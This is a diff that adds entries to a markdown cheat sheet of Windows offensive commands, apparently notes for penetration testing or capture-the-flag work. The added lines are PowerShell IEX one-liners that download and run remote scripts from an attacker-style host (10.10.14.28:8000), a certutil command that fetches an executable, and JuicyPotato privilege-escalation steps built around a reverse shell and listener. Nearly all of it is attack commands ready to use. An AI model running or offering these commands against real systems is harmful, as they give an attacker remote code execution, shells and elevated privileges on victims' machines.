@@ -47,9 +47,26 @@
 ## Powershell download a file
 	powershell.exe  (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip") 
 
+## Powershell via CMD
+	cmd.exe /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.28:8000/shell.ps1')
 
 ## Powershell download an execute file
 	powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<IP>/<script>')"
+
+
+## Certutils file download
+	certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
+
+## Jucypotato
+	https://github.com/ohpe/juicy-potato/releases
+		Usage:
+			1. Deploy reverse shell:
+					shell_1338.ps1
+			2. Create `shell.bat` file with next content:
+				powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.28:8000/shell_1338.ps1')
+			3. Start listener on 1338 and run jucypotato:
+ 				.\JuicyPotato.exe -t * -p shell.bat -l 1338
+
 
 
 ## Powershell execution restricted
